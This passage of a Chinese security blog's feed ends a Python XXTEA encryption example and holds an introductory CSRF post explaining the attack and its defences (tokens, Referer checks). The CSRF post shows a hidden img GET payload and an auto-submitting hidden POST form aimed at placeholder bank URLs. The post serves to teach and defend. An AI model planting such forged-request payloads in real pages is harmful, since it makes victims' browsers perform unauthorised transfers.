class="keyword">in</span> range(n - <span class="number">1</span>):</span><br><span class="line">            y = v[p + <span class="number">1</span>]</span><br><span class="line">            v[p] = (v[p] + shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            z = v[p]</span><br><span class="line">        p += <span class="number">1</span></span><br><span class="line">        y = v[<span class="number">0</span>]</span><br><span class="line">        v[n - <span class="number">1</span>] = (v[n - <span class="number">1</span>] + shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        z = v[n - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(v, k)</span>:</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    n = len(v)</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> / n</span><br><span class="line">    x = (rounds * delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    y = v[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(rounds):</span><br><span class="line">        e = (x &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> range(n - <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">            z = v[p - <span class="number">1</span>]</span><br><span class="line">            v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            y = v[p]</span><br><span class="line">        p -= <span class="number">1</span></span><br><span class="line">        z = v[n - <span class="number">1</span>]</span><br><span class="line">        v[<span class="number">0</span>] = (v[<span class="number">0</span>] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        y = v[<span class="number">0</span>]</span><br><span class="line">        x = (x - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    plain = [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">    key = [<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">    encrypted = encrypt(plain, key)</span><br><span class="line">    <span class="keyword">print</span> encrypted</span><br><span class="line">    decrypted = decrypt(encrypted, key)</span><br><span class="line">    <span class="keyword">print</span> decrypted</span><br></pre></td></tr></table></figure><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://blog.csdn.net/gsls200808/article/details/48243019" target="_blank" rel="noopener">https://blog.csdn.net/gsls200808/article/details/48243019</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;闲来无事，喝杯茶冷静一下。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="crypto" scheme="https://qianfei11.github.io/tags/crypto/"/>
    
      <category term="python" scheme="https://qianfei11.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>从零开始认识跨站请求伪造（Cross-site Request Forgery）</title>
    <link href="https://qianfei11.github.io/2019/08/20/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%AE%A4%E8%AF%86%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88Cross-site-Request-Forgery%EF%BC%89/"/>
    <id>https://qianfei11.github.io/2019/08/20/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%AE%A4%E8%AF%86%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88Cross-site-Request-Forgery%EF%BC%89/</id>
    <published>2019-08-20T05:51:34.000Z</published>
    <updated>2019-08-26T05:46:11.368Z</updated>
    
    <content type="html"><![CDATA[<p>常常听到 CSRF，但不怎么了解它具体的机制，简单记录一下。</p><a id="more"></a><h1 id="What-is-CSRF"><a href="#What-is-CSRF" class="headerlink" title="What is CSRF"></a>What is CSRF</h1><p>CSRF（跨站请求伪造，<code>Cross-site Request Forgery</code>）也被称为<code>One-click Attack</code>或者<code>Session Riding</code>。简单的来说，就是<strong>攻击者利用受害者的身份，以受害者的名义发送恶意请求</strong>。</p><p>CSRF 这种攻击方式在 2000 年被国外的安全人员提出，但在国内，直到 2006 年才开始被关注。2008 年，国内外的多个大型社区和交互网站分别爆出 CSRF 漏洞，如：纽约时报，Metafilter，YouTube，百度等等。而现在，互联网的许多站点仍对此毫无防备，以至于安全业界称 CSRF 为“沉睡的巨人”。</p><p><img src="/pics/从零开始认识跨站请求伪造/1.png" alt="CSRF原理"></p><p>首先比较一下 XSS 和 CSRF：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># XSS</span><br><span class="line">攻击者发现XSS漏洞——构造代码——发送给受害人——受害人打开——攻击者获取受害人的cookie——完成攻击</span><br><span class="line">XSS容易发现，因为攻击者需要登录后台完成攻击。管理员可以看日志发现攻击者</span><br><span class="line">XSS的目的是获取用户的身份信息，攻击者窃取到的是用户的身份（session/cookie）</span><br><span class="line"># CSRF</span><br><span class="line">攻击者发现CSRF漏洞——构造代码——发送给受害人——受害人打开——受害人执行代码——完成攻击</span><br><span class="line">CSRF的攻击一直是管理员自己实现的，攻击者只负责了构造代码</span><br><span class="line">CSRF是利用用户当前的身份去做一些未经过授权的操作</span><br></pre></td></tr></table></figure><p>用一个小故事简单的介绍一下什么是 CSRF：</p><ol><li>我们先假设支付宝存在 CSRF 漏洞，受害者的支付宝账号是<code>alibaba</code>，攻击者的支付宝账号是<code>hacker</code></li><li>然后我们通过网页请求的方式<code>http://zhifubao.com/withdraw?account=alibaba&amp;amount=10000&amp;for=alibaba2</code>可以把账号<code>alibaba</code>的 10000 元转到另外一个账号<code>alibaba2</code>上去。通常情况下，该请求发送到支付宝服务器后，服务器会先验证该请求是否来自一个合法的<code>session</code>并且该<code>session</code>的用户已经成功登陆</li><li>攻击者在支付宝有账号<code>hacker</code>，并且他知道上文中的 URL 可以进行转账操作，于是他可以发送一个请求<code>http://zhifubao.com/withdraw?account=alibaba&amp;amount=10000&amp;for=hacker</code>到支付宝后台。但是这个请求是来自攻击者而不是来自<code>alibaba</code>，所以不能通过安全认证，因此该请求作废</li><li>这时，攻击者<code>hacker</code>想到了用 CSRF 的方式，他自己做了个黄色网站，在网站中放了如下代码：<code>http://zhifubao.com/withdraw?account=alibaba&amp;amount=10000&amp;for=hacker</code>，并且通过黄色链接诱使受害者来访问他的网站。当受害者禁不住诱惑时就会点了进去，上述请求就会从受害者的浏览器发送到支付宝，而且这个请求会附带受害者的浏览器中的<code>cookie</code></li><li>大多数情况下，该请求会失败，因为支付宝会要求受害者的认证信息，但是如果刚访问支付宝不久，还没有关闭支付宝页面，浏览器中的<code>cookie</code>仍然存有认证信息，这个请求就会得到响应，从受害者的账户中转 10000 元到<code>hacker</code>账户里，而受害者丝毫不知情，攻击者拿到钱后逍遥法外</li></ol><h1 id="How-to-Attack"><a href="#How-to-Attack" class="headerlink" title="How to Attack"></a>How to Attack</h1><p>CSRF 有两种攻击方式，一种是基于 GET 请求方式的利用，另一种是基于 POST 请求方式的利用。</p><h2 id="Get-Method"><a href="#Get-Method" class="headerlink" title="Get Method"></a>Get Method</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&apos;https://www.xxx.com/bank.php?transferTo=hacker&apos; width=&apos;0&apos; height=&apos;0&apos; /&gt;</span><br><span class="line">&lt;a href=&apos;/test&apos;&gt;start&lt;/a&gt;</span><br></pre></td></tr></table></figure><h2 id="Post-Method"><a href="#Post-Method" class="headerlink" title="Post Method"></a>Post Method</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe style=&quot;display:none&quot; name=&quot;csrf-frame&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;form method=&apos;POST&apos; action=&apos;https://www.xxx.com/bank.php&apos; target=&quot;csrf-frame&quot; id=&quot;csrf-form&quot;&gt;</span><br><span class="line">  &lt;input type=&apos;hidden&apos; name=&apos;id&apos; value=&apos;3&apos;&gt;</span><br><span class="line">  &lt;input type=&apos;submit&apos; value=&apos;submit&apos;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;document.getElementById(&quot;csrf-form&quot;).submit()&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="How-to-Prevent"><a href="#How-to-Prevent" class="headerlink" title="How to Prevent"></a>How to Prevent</h1><p>防范 CSRF 攻击，其实本质就是要求网站能够识别出哪些请求是非正常用户主动发起的。这就要求我们在请求中嵌入一些额外的授权数据，让网站服务器能够区分出这些未授权的请求。</p><h2 id="Synchronizer-token-pattern"><a href="#Synchronizer-token-pattern" class="headerlink" title="Synchronizer token pattern"></a>Synchronizer token pattern</h2><p>令牌同步模式（Synchronizer token pattern，简称 STP）是在用户请求的页面中的所有表单中嵌入一个 token，在服务端验证这个 token 的技术。token 可以是任意的内容，但是一定要保证无法被攻击者猜测到或者查询到。攻击者在请求中无法使用正确的 token，因此可以判断出未授权的请求</p><h2 id="Cookie-to-Header-Token"><a href="#Cookie-to-Header-Token" class="headerlink" title="Cookie-to-Header Token"></a>Cookie-to-Header Token</h2><p>对于使用 Js 作为主要交互技术的网站，将 CSRF 的 token 写入到 cookie 中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: CSRF-token=i8XNjC4b8KVok4uw5RftR38Wgp2BFwql; expires=Thu, 23-Jul-2015 10:25:33 GMT; Max-Age=31449600; Path=/</span><br></pre></td></tr></table></figure><p>然后使用 javascript 读取 token 的值，在发送 http 请求的时候将其作为请求的 header</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-CSRF-Token: i8XNjC4b8KVok4uw5RftR38Wgp2BFwql</span><br></pre></td></tr></table></figure><p>最后服务器验证请求头中的 token 是否合法</p><h2 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h2><p>使用验证码可以杜绝 CSRF 攻击，但是这种方式要求每个请求都输入一个验证码，显然没有哪个网站愿意使用这种粗暴的方式，用户体验太差，用户会疯掉的。</p><h2 id="验证-HTTP-Referer-字段"><a href="#验证-HTTP-Referer-字段" class="headerlink" title="验证 HTTP Referer 字段"></a>验证 HTTP Referer 字段</h2><p>根据 HTTP 协议，在 HTTP 头部中有一个 Referer 字段，它记录了该 HTTP 请求所在的地址，表示 HTTP 请求从那个页面发出的。比如当访问<code>http://zhifubao.com/withdraw?account=lyq&amp;amount=10000&amp;for=xxx</code>，用户必须先登录支付宝网站，然后通过点击页面的的按钮来触发转账事件。此时，转账请求的 Referer 值就是转账页面所在的 URL，通常是以<code>zhifubao.com</code>域名开头的地址。如果攻击者要实行 CSRF 攻击，那么他只能在自己的站点构造请求，此时 Referer 的值就指向黑客自己的网站。因此要防御 CSRF 攻击，支付宝只需要对每一个转账请求验证其 Referer 值，如果是以<code>zhifubao.com</code>开头的域名，则是合法请求，相反，则是非法请求并拒绝。</p><p>这种方法的好处就是简单易行，只需要在后台添加一个拦截器来检查 Referer 即可。然而这种办法并不是万无一失，Referer 的值是由浏览器提供的，一些低级的浏览器可以通过某种方式篡改 Referer 的值，这就给了攻击者可乘之机；而一些高级浏览器处于安全考虑，可以让用户设置发送 HTTP 请求时不再提供 Referer 值，这样当他们正常访问支付宝网站时，因为没有提供 Referer 值而被误认为 CERF 攻击，拒绝访问。实际应用中通常采用第二种方法来防御 CSRF 攻击。</p><h2 id="尽量使用-POST，限制-GET"><a href="#尽量使用-POST，限制-GET" class="headerlink" title="尽量使用 POST，限制 GET"></a>尽量使用 POST，限制 GET</h2><p>GET 接口能够直接将请求地址暴露给攻击者，所以要防止 CSRF 一定最好不要用 GET。当然 POST 并不是万无一失，攻击者只需要构造一个 form 表单就可以，但需要在第三方页面做，这样就增加了暴露的可能性。</p><h2 id="在-HTTP-头部添加自定义属性"><a href="#在-HTTP-头部添加自定义属性" class="headerlink" title="在 HTTP 头部添加自定义属性"></a>在 HTTP 头部添加自定义属性</h2><p>这种方法也是使用 token 并验证，但是它是把 token 放在 HTTP 请求头部中。通过使用 AJAX 我们可以在我们的请求头部中添加我们的自定义属性，但是这种方法要求我们将整个站的请求全部改成 AJAX，如果是新站还好，老站的话无疑是需要重写整个站点的，这是很不可取的。</p><h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul><li><a href="http://exp-blog.com/2019/01/13/pid-2927/" target="_blank" rel="noopener">RootMe 解题报告 [Web-Client : CSRF – 0 protection]</a></li><li><a href="http://exp-blog.com/2019/01/13/pid-2933/" target="_blank" rel="noopener">RootMe 解题报告 [Web-Client : CSRF – token bypass]</a></li></ul><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.freebuf.com/articles/web/55965.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/55965.html</a><br><a href="https://segmentfault.com/a/1190000008505616" target="_blank" rel="noopener">https://segmentfault.com/a/1190000008505616</a><br><a href="https://www.jianshu.com/p/855395f9603b" target="_blank" rel="noopener">https://www.jianshu.com/p/855395f9603b</a><br><a href="https://juejin.im/post/5bc009996fb9a05d0a055192" target="_blank" rel="noopener">https://juejin.im/post/5bc009996fb9a05d0a055192</a><br><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html" target="_blank" rel="noopener">https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html</a><br><a href="https://blog.techbridge.cc/2017/02/25/csrf-introduction/" target="_blank" rel="noopener">https://blog.techbridge.cc/2017/02/25/csrf-introduction/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;常常听到 CSRF，但不怎么了解它具体的机制，简单记录一下。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="web" scheme="https://qianfei11.github.io/tags/web/"/>
    
  </entry>
  
</feed>
